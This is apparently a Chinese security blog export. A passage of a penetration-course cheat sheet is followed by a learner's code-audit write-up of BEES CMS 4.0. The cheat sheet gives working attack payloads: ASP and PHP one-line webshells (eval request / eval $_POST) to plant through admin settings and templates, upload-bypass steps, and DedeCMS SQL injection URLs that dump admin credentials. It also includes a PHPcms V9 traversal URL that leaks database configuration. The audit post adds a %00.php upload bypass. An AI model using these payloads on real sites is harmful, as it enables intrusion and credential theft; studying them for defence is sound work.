<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可 2.网站配置-网站地址-插入闭合的一句话木马：<a href="http://”%&gt;" target="_blank" rel="noopener">http://”%&gt;</a>&lt;%execute(request(“g”))%&gt;&lt;%’ 3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
<p>（ 利用upfile_other.asp漏洞拿shell ）</p>
<p>直接访问会员中心：userreg.asp</p>
<p>注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer</p>
<p>另外可以利用会员中心的cookies，用火狐浏览器登陆之后，访问upfile_other.asp页面，用抓包工具去抓包，接着用明小子上传拿shell.</p>
<p>（ 上传漏洞 ）</p>
<p>漏洞文件：Upfile_Photo.asp</p>
<p>前提是进入后台了，访问这个文件，将提示“请先选择你要上传的文件！”，用抓包工具抓管理员的cookies，再把上传地址跟cookies扔到名小子里上传拿shell</p>
<h3 id="（-南方在线编辑器-）"><a href="#（-南方在线编辑器-）" class="headerlink" title="（ 南方在线编辑器 ）"></a>（ 南方在线编辑器 ）</h3><p>默认后台：admin/Southidceditor/admin_style.asp</p>
<p>数据库路径：admin/SouthidcEditorDatasSouthidcEditor.mdb</p>
<p>遍历目录：admin/Southidceditor/admin_uploadfile.asp?id=14&amp;dir=../..</p>
<p>文件上传页面：admin/Southidceditor/ewebeditor.asp?id=57&amp;style=southidc</p>
<p>样式设置页面：admin/SouthidcEditor/Admin_Style.asp?action=styleset&amp;id=47</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="dedecms注入漏洞及找后台技巧"><a href="#dedecms注入漏洞及找后台技巧" class="headerlink" title="dedecms注入漏洞及找后台技巧 :"></a>dedecms注入漏洞及找后台技巧 :</h3><p>访问这个：plus/search.php?keyword=as&amp;typeArr[ uNion ]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 1 !那么直接用下面的exp爆出所有管理员的帐号密码：</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+and+(SELECT+1+FROM+(select+count(<em>),concat(floor(rand(0)</em>2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%23@__admin+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@’+]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 2 !</p>
<p>那么直接用下面的exp爆出所有管理员的帐号密码</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%23@__admin%23@’+]=a</p>
<p>有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了</p>
<p>破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可</p>
<p>如何找后台？</p>
<p>默认后台：dede</p>
<p>第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）</p>
<p>第二种方法：把域名作为后台去尝试</p>
<p>第三种方法：查看这个文件：robots.txt</p>
<p>第四种方法：ping下域名获得ip之后，<a href="http://www.bing.com/" target="_blank" rel="noopener">http://www.bing.com/</a> 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="PHPcms-V9-爆数据库信息漏洞"><a href="#PHPcms-V9-爆数据库信息漏洞" class="headerlink" title="PHPcms V9 爆数据库信息漏洞:"></a>PHPcms V9 爆数据库信息漏洞:</h3><p>直接爆出数据库连接信息：/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php</p>
<p>关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码</p>
<p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[0day])’.”rnrn?”.”&gt;rn”);</p>
<p>点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day</p>
<p><br></p>
<center><strong>·End·</strong></center></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 渗透课程 </tag>
            
            <tag> Mark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计实例-BEES_4.0_R_20160525]]></title>
      <url>/2017/12/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E4%BE%8B-BEES-4-0-R-20160525/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>从0到1，从无到有……</p>
<p>开始涉足代码审计，了解了一些敏感函数之后，是时候拿点实例来练练手了！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p>把握大局（分析网站结构）-&gt;  通读全文法/敏感函数参数回溯法/定向功能分析法  -&gt; </p>
<p><br></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><p>用sexy法师的审计系统扫一扫，发现存在四个地方存在文件上传（move_uploaded_file 函数）</p>
<p>1.admin_pic.php</p>
<blockquote>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fms93w2edbj30su02w0su.jpg" width="50%"></p>
<p>这个只是在图片列表“修改”选项处的重新上传，并将旧照片替换掉，用burp改参数的确可以直接传一个php文件，但是后缀名是不变的，所以没有利用的地方。</p>
</blockquote>
<p>2.fun.php</p>
<blockquote>
<p>定义函数的汇总 php。这里定义了一个 up_img 函数，规定了大小、格式、是否重名……</p>
<p>同样的，上传这一关很容易就bypass过去了。但是仔细审计 up_img 函数就会发现。它的 $file_name 不是直接就从上传那直接获得，而是经过一系列的拼接，估计就是为了防止稍微用burp改一下参数就导致文件上传漏洞的产生吧！</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fmsaj82fhoj30z40a2aaz.jpg" width="50%"></p>
</blockquote>
<p>3.img.class.php</p>
<blockquote>
<p>这里也有一些关于图片信息的函数，文件名是由“年月日时分秒+id（rand）+拓展名（ext）”拼接而成</p>
</blockquote>
<p>4.upload_more.php</p>
<blockquote>
<p>上传多张图片</p>
</blockquote>
<p>在upload.php中测试怎么bypass<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fmt8uyotp9j30tk0cqgm9.jpg" width="50%"></p>
<p>经过上述php的审计，得出他是用白名单策略来检查扩展名，所以就试了下 <strong>nginx空子节漏洞</strong>，用burp在.jpg后加上<strong>%00.php</strong>后发现上传的jpg文件已经被解析为php了。所以…. <strong>:)</strong> </p>
<p>难道只存在解析漏洞？再找找看～～</p>
<p>但是我又在之前已嵌入php代码的png文件中尝试用%00.php 来执行png中的代码，发现不得行：<img src="https://ws3.sinaimg.cn/large/006tNc79gy1fmt9e5nmcxj313e0eeaam.jpg" width="50%"></p>
<p>初步分析是过滤了<strong>%</strong>，<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmu79c9wx2j30ae01eq2s.jpg" width="30%">但是直接在url上加%后enter，发现，没有被转义啊！<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmu7a6tic6j308y01a3yc.jpg" width="30%"></p>
<p><strong>But Why？</strong></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>验证文件头只要为GIF89a，就会返回真</p>
<p>1.admin_pic.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($is_thumb)&#123;<span class="comment">//开启缩略图</span></span><br><span class="line">		$file_info=@getimagesize($file_name);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($file_info))&#123;msg(<span class="string">'图片不存在，操作失败'</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>2.fun.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!move_uploaded_file($file[<span class="string">'tmp_name'</span>],$file_name))&#123;</span><br><span class="line">			msg(<span class="string">'图片上传失败'</span>,<span class="string">''</span>,<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$file_info=@getimagesize($file_name);</span><br><span class="line">			<span class="keyword">switch</span>($file_info[<span class="number">2</span>])&#123;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> 			$php_file=@imagecreatefromgif($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> 			$php_file=@imagecreatefromjpeg($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"> 			$php_file=@imagecreatefrompng($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			&#125;</span><br></pre></td></tr></table></figure>
<p>上传图片下面有getimagesize()函数，对参数进行处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_sys[<span class="string">'image_type'</span>][<span class="number">0</span>])&#123;</span><br><span class="line">				$logo=CMS_PATH.<span class="string">'upload/'</span>.$_sys[<span class="string">'pic'</span>];</span><br><span class="line">				$logo_info=@getimagesize($logo);</span><br><span class="line">				<span class="keyword">switch</span>($logo_info[<span class="number">2</span>])&#123;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefromgif($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefromjpeg($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefrompng($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				&#125;</span><br></pre></td></tr></table></figure>
<p>虽然加了png文件头，识别为图片后缀。但是想绕过上传，怕是不大行，因为都是用同一套上传验证机制。这个函数好像在这里好像只是用于读取长宽，并判断后缀名，下面也对postion位置进行case分类[1-2-3]，然后拼接。用imagecopy拷贝一下图像参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagecopy($logo_img,$logo_file,$position[<span class="number">0</span>],$position[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,$logo_info[<span class="number">0</span>],$logo_info[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000003911296" target="_blank" rel="noopener">getimagesize 函数不是完全可靠的</a></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>遍历了所有包含<strong>include</strong>的文件，全都是直接拼接的路径like “ <strong>include(DATA_PATH.$lang.’_info.php’);</strong> “,没有发现包含来自（$_GET or $POST ）来的文件，所以。。在当前的知识框架下，我好像找不到其他利用的方式，也就无法配合<strong>伪协议+文件上传漏洞</strong>来利用。</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><h4 id="先从-file-get-contents-入手"><a href="#先从-file-get-contents-入手" class="headerlink" title="先从 file_get_contents() 入手"></a>先从 <strong>file_get_contents()</strong> 入手</h4><p>1 -&gt; mail.php</p>
<blockquote>
<p>$privKeyStr = file_get_contents($this-&gt;DKIM_private); </p>
<p><strong>DKIM是域名密钥识别邮件标准</strong> ，所以此处应该只是将隐私信息赋给 $privkeystr ，没有发现可控的地方。</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;$file = tempnam(<span class="string">''</span>, <span class="string">'mail'</span>);</span><br><span class="line">&gt;</span><br><span class="line">&gt;file_put_contents($file, $body); <span class="comment">//TODO check this worked</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;$signed = tempnam(<span class="string">""</span>, <span class="string">"signed"</span>);</span><br><span class="line">&gt;<span class="keyword">if</span> (@openssl_pkcs7_sign($file, $signed, <span class="string">"file://"</span>.<span class="keyword">$this</span>-&gt;sign_cert_file, <span class="keyword">array</span>(<span class="string">"file://"</span>.<span class="keyword">$this</span>-&gt;sign_key_file, <span class="keyword">$this</span>-&gt;sign_key_pass), <span class="keyword">NULL</span>)) &#123;</span><br><span class="line">&gt;</span><br><span class="line">&gt;@unlink($file);</span><br><span class="line">&gt;</span><br><span class="line">&gt;@unlink($signed);</span><br><span class="line">&gt;</span><br><span class="line">&gt;$body = file_get_contents($signed);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<blockquote>
<p><strong>$signed = tempnam(“”, “signed”);     </strong></p>
<p>// tempnam(dir,prefix)   创建一个具有唯一文件名的临时文件。</p>
<p><strong>@openssl_pkcs7_sign($file, $signed, “file://“.$this-&gt;sign_cert_file, array(“file://“.$this-&gt;sign_key_file, $this-&gt;sign_key_pass), NULL)</strong></p>
<p>// openssl_pkcs7_sign  —&gt; <em>Sign an S/MIME message</em> 好像是一个类似数字签名验证的东西</p>
</blockquote>
<p>$signed 里面的数据是在验证中从 $file 中传过去的，而 $file &lt;- sign_cert_file  ，好像也没有可控的变量 <strong>:(</strong></p>
<hr>
<p>$file_buffer  = file_get_contents($path);</p>
<p>$file_buffer  = $this-&gt;EncodeString($file_buffer, $encoding);  // base64转义</p>
</blockquote>
<p>2 -&gt; admin_db.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($action==<span class="string">'save_import'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!check_purview(<span class="string">'data_import'</span>))&#123;msg(<span class="string">'&lt;span style="color:red"&gt;操作失败,你的权限不足!&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	$fl = $_GET[<span class="string">'fl'</span>];</span><br><span class="line">	$time = <span class="keyword">isset</span>($_GET[<span class="string">'time'</span>])?$_GET[<span class="string">'time'</span>]:<span class="string">''</span>;</span><br><span class="line">	$rand = <span class="keyword">isset</span>($_GET[<span class="string">'rand'</span>])?$_GET[<span class="string">'rand'</span>]:<span class="string">''</span>;</span><br><span class="line">	$page = <span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])?$_GET[<span class="string">'page'</span>]:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($fl))&#123;err(<span class="string">'&lt;span style="color:red"&gt;参数传递错误,请重新操作&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>($time&amp;&amp;$rand&amp;&amp;$page)&#123;</span><br><span class="line">$import_file =DATA_PATH.<span class="string">'backup/'</span>.$fl.<span class="string">'/db_backup_'</span>.$time.<span class="string">'_'</span>.$rand.<span class="string">'_'</span>.$page.<span class="string">'.sql'</span>;</span><br><span class="line">	<span class="keyword">if</span>(@file_exists($import_file))</span><br><span class="line">	&#123;</span><br><span class="line">		$data=@file_get_contents($import_file);</span><br><span class="line">		$data=explode(<span class="string">";\n"</span>,trim($data));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>($data))&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">				$GLOBALS[<span class="string">'mysql'</span>]-&gt;query($v);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		show_htm(<span class="string">'卷'</span>.$page.<span class="string">'导入完成'</span>,<span class="string">'?action=save_import&amp;fl='</span>.$fl.<span class="string">'&amp;time='</span>.$time.<span class="string">'&amp;rand='</span>.$rand.<span class="string">'&amp;page='</span>.($page+<span class="number">1</span>).<span class="string">'&amp;nav='</span>.$admin_nav.<span class="string">'&amp;admin_p_nav='</span>.$admin_p_nav);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>$file_get_contents  &lt;- $import_file &lt;-(DATA_PATH.’backup/‘.$fl.’/db<em>backup</em>‘.$time.’<em>‘.$rand.’</em>‘.$page.’.sql’)</p>
<p>其中 <strong>$f1、$time、$rand、$page</strong> 都是通过 $_GET 传递的，所以，是可控的，看看是否有利用的价值。</p>
<blockquote>
<p>三元运算符： <strong>?: </strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; &gt; <span class="comment">// Example usage for: Ternary Operator</span></span><br><span class="line">&gt; &gt; $action = (<span class="keyword">empty</span>($_POST[<span class="string">'action'</span>])) ? <span class="string">'default'</span> : $_POST[<span class="string">'action'</span>];</span><br><span class="line">&gt; &gt;</span><br><span class="line">&gt; &gt; <span class="comment">// The above is identical to this if/else statement</span></span><br><span class="line">&gt; &gt; <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'action'</span>])) &#123;</span><br><span class="line">&gt; &gt;     $action = <span class="string">'default'</span>;</span><br><span class="line">&gt; &gt; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&gt; &gt;     $action = $_POST[<span class="string">'action'</span>];</span><br><span class="line">&gt; &gt; &#125;</span><br><span class="line">&gt; &gt; <span class="meta">?&gt;</span></span><br><span class="line">&gt; &gt;</span><br></pre></td></tr></table></figure>
<p>explode() 把字符串打散为数组</p>
<p>trim() 移除字符串两侧的字符</p>
</blockquote>
</blockquote>
<p>3 -&gt; tpl.class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($include_cache)&#123;<span class="keyword">$this</span>-&gt;template_is_cache=<span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_file=<span class="keyword">$this</span>-&gt;template_dir.$template_file.<span class="string">'.html'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="keyword">$this</span>-&gt;template_file))&#123;<span class="keyword">die</span>(<span class="string">'不存在模板文件'</span>.$template_file.<span class="string">'.html'</span>);&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_file_content=file_get_contents(<span class="keyword">$this</span>-&gt;template_file);</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_com_file=<span class="keyword">$this</span>-&gt;template_compile.$template_file.<span class="string">'_'</span>.<span class="keyword">$this</span>-&gt;template_lang.<span class="keyword">$this</span>-&gt;mb.<span class="string">'_compile.php'</span>;<span class="comment">//编译文件</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;cache();<span class="comment">//生成缓存文件</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;compile();<span class="comment">//编译模板</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view($is_copy);<span class="comment">//显示模板</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;tp)&#123;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;content;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>$this-&gt;template_file &lt;- $this-&gt;template_dir.$template_file.’.html’ 未发现可控变量，而且模版是直接从数据库中调出，并没有上传模版的地方。</p>
</blockquote>
<h4 id="再从-fread-入手"><a href="#再从-fread-入手" class="headerlink" title="再从 fread() 入手"></a>再从 fread() 入手</h4><p>1 -&gt; fun.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_lang</span><span class="params">($lang)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($lang))&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$fp=@fopen(LANG_PATH.<span class="string">'lang_cn.php'</span>,<span class="string">'r'</span>))&#123;</span><br><span class="line">			msg(<span class="string">'基本语言包不能操作，请检查是否有操作文件的权限'</span>,<span class="string">'javascript:history.go(-1);'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$fl=fread($fp,filesize(LANG_PATH.<span class="string">'lang_cn.php'</span>));</span><br><span class="line">		<span class="keyword">unset</span>($fp);</span><br><span class="line">		$fp2=@fopen(LANG_PATH.<span class="string">'lang_'</span>.$lang.<span class="string">'.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">		<span class="keyword">return</span> fwrite($fp2,$fl);</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creat_inc</span><span class="params">($fl,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists($fl))&#123;@unlink($fl);&#125;</span><br><span class="line">	<span class="keyword">if</span>(!$fp=@fopen($fl,<span class="string">'w'</span>))&#123;</span><br><span class="line">		msg(<span class="string">'文件打开失败,请检查是否有足够的权限操作文件'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flock($fp,LOCK_EX);</span><br><span class="line">	<span class="keyword">if</span>(!fwrite($fp,$str))&#123;</span><br><span class="line">		msg(<span class="string">'写入文件失败,请检查是否有足够的权限操作文件'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flock($fp,LOCK_UN);</span><br><span class="line">	<span class="keyword">unset</span>($fp);</span><br></pre></td></tr></table></figure>
<p>生成语言配置文件，好像。。没办法从基本语言包处入手啊！</p>
<p>2 -&gt; admin_template_php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($action==<span class="string">'xg'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!check_purview(<span class="string">'tpl_manage'</span>))&#123;msg(<span class="string">'&lt;span style="color:red"&gt;操作失败,你的权限不足!&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	$path=CMS_PATH.$file;</span><br><span class="line">	<span class="keyword">if</span>(!$fp=@fopen($path,<span class="string">'r+'</span>))&#123;err(<span class="string">'&lt;span style="color:red"&gt;模板打开失败,请确定【'</span>.$file.<span class="string">'】模板是否存在&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	flock($fp,LOCK_EX);</span><br><span class="line">	$str=@fread($fp,filesize($path));</span><br><span class="line">	$str = str_replace(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>,$str);</span><br><span class="line">	$str= str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>),<span class="keyword">array</span>(<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;lt;"</span>,<span class="string">"&amp;gt;"</span>),$str);</span><br><span class="line">	flock($fp,LOCK_UN);</span><br><span class="line">	fclose($fp);</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'template/admin_template_xg.php'</span>);</span><br></pre></td></tr></table></figure>
<p>$path &lt;- CMS_PATH.$file &lt;-$_GET[‘file’]</p>
<p>虽然变量可控，但是好像没有echo的地方啊，也无法形成任意文件读取漏洞～ <strong>:(</strong></p>
<p>​                         </p>
<p>3 -&gt; mail.php</p>
<p><a href="http://blog.nsfocus.net/multiple-php-mail-function-vulnerability-analysis/" target="_blank" rel="noopener">多个PHP mail函数引发的命令执行漏洞分析</a></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>1-&gt; member.php</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmww1nf2i1j315q01at8m.jpg" width="50%">登陆的时候随便测试了一下万能密码，发现 <strong>‘</strong> 被 <strong>\’</strong> 转义了，<strong>=</strong> 也被过滤了。</p>
<p>但是在burp上稍微改改参数，但是会显示密码不正确，好像还没看懂如何验证登录。</p>
<p>首页的搜索框是不是也可以看看有没有注入的点？</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmwwlehuvej308m01adfo.jpg" width="30%">好像一有query语句，就会有x和y……</p>
<p>然后sql语句执行了有上90条～估计是遍历各个地方看看有没有所需的东西。</p>
<h2 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码/命令执行"></a>代码/命令执行</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>1.mail.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;SingleToArray <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!@$mail = popen($sendmail, <span class="string">'w'</span>)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;Lang(<span class="string">'execute'</span>) . <span class="keyword">$this</span>-&gt;Sendmail, <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">        &#125;</span><br><span class="line">        fputs($mail, <span class="string">"To: "</span> . $val . <span class="string">"\n"</span>);</span><br><span class="line">        fputs($mail, $header);</span><br><span class="line">        fputs($mail, $body);</span><br><span class="line">        $result = pclose($mail);</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="NOTES"><a href="#NOTES" class="headerlink" title="NOTES"></a>NOTES</h3><p><a href="https://www.zhihu.com/question/39878368?sort=created" target="_blank" rel="noopener">payload、shellcode、exp、poc怎么区别？</a></p>
<p><a href="http://blog.csdn.net/hanliuxinming/article/details/20871165" target="_blank" rel="noopener">php中$this-&gt;是什么意思？</a></p>
<p><a href="http://blog.csdn.net/u012767263/article/details/16952757" target="_blank" rel="noopener">PHP中的符号 -&gt;、=&gt; 和 :: 分别表示什么意思?</a></p>
